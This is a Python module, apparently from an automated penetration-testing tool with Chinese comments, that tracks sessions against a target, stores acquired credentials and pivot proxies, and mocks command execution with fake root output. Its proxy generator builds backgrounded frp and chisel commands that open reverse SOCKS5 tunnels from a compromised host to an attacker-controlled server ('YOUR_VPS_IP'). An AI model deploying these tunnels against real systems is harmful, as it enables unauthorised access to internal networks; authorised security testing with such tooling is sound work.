import logging
import json
import uuid
import threading
import socket
import random
from typing import Dict, Any, List

logger = logging.getLogger(__name__)

class PenetrationState:
    def __init__(self, target_ip: str):
        self.target_ip = target_ip
        self.current_stage = "Initial"
        self.acquired_credentials = {}
        self.pivoting_proxies = [] # e.g. [{"ip": "10.0.0.5", "port": 1080, "type": "socks5"}]
        self.notes = []

    def add_proxy(self, ip: str, port: int, proxy_type: str = "socks5"):
        proxy = {"ip": ip, "port": port, "type": proxy_type}
        if proxy not in self.pivoting_proxies:
            self.pivoting_proxies.append(proxy)
            logger.info(f"[*] Added new inner-network proxy tunnel: {proxy_type}://{ip}:{port}")
            self.notes.append(f"Proxy added: {proxy_type}://{ip}:{port}")

    def to_json(self):
        return {
            "target_ip": self.target_ip,
            "current_stage": self.current_stage,
            "acquired_credentials": self.acquired_credentials,
            "pivoting_proxies": self.pivoting_proxies,
            "notes": self.notes
        }

class SessionManager:
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()

    def create_session(self, target_ip: str):
        with self.lock:
            session_id = str(uuid.uuid4())
            state_machine = PenetrationState(target_ip)
            self.sessions[session_id] = {
                "state": state_machine,
                "history": []
            }
            return session_id, state_machine

    def get_state(self, session_id: str) -> PenetrationState:
        with self.lock:
            return self.sessions.get(session_id, {}).get("state")

    def _find_free_port(self) -> int:
        """寻找一个可用的随机端口"""
        for _ in range(10):
            port = random.randint(10000, 60000)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                try:
                    s.bind(('', port))
                    return port
                except OSError:
                    continue
        return random.randint(10000, 60000) # fallback

    def generate_proxy_config(self, session_id: str, proxy_type: str = "frp", server_ip: str = "YOUR_VPS_IP") -> Dict[str, Any]:
        """
        动态为内网穿透生成配置文件，避免端口冲突
        """
        state = self.get_state(session_id)
        if not state:
            return {"error": "Session not found"}

        # 分配一个空闲端口
        proxy_port = self._find_free_port()
        unique_id = str(uuid.uuid4())[:8]
        
        config_data = {}
        if proxy_type == "frp":
            config_text = (
                f"[common]\n"
                f"server_addr = {server_ip}\n"
                f"server_port = 7000\n"
                f"tls_enable = true\n\n"
                f"[socks5_{unique_id}]\n"
                f"type = tcp\n"
                f"remote_port = {proxy_port}\n"
                f"plugin = socks5\n"
            )
            config_data = {
                "proxy_type": "frp",
                "assigned_port": proxy_port,
                "config_text": config_text,
                "deploy_command": f"echo '{config_text}' > /tmp/frpc_{unique_id}.ini && frpc -c /tmp/frpc_{unique_id}.ini &"
            }
        elif proxy_type == "chisel":
            config_data = {
                "proxy_type": "chisel",
                "assigned_port": proxy_port,
                "config_text": f"Chisel Command: Run background client connecting to server.",
                "deploy_command": f"chisel client {server_ip}:8080 R:{proxy_port}:socks &"
            }
        else:
            return {"error": f"Unsupported proxy type: {proxy_type}"}

        logger.info(f"⚡ [Proxy Gen] 动态渲染生成的 {proxy_type} 隧道端口为: {proxy_port}, 会话: {session_id}")
        
        # 预先将该代理信息放入状态机, 虽然还没证明连接成功, 但准备让链式接管
        state.add_proxy(ip="127.0.0.1", port=proxy_port, proxy_type="socks5")

        return config_data

    def execute_command(self, session_id: str, command: str) -> str:
        # Mocking webshell execution via proxy if needed
        state = self.get_state(session_id)
        if not state:
            return "Session not found."
        
        prefix = ""
        if state.pivoting_proxies:
            prox = state.pivoting_proxies[-1]
            prefix = f"[Proxychains via {prox['ip']}:{prox['port']}] "
            
        result = f"{prefix}Execute mocked: {command}\nuid=0(root) gid=0(root)\nResult successfully tunneled."
        
        with self.lock:
            self.sessions[session_id]["history"].append({"command": command, "result": result})
            
        return result
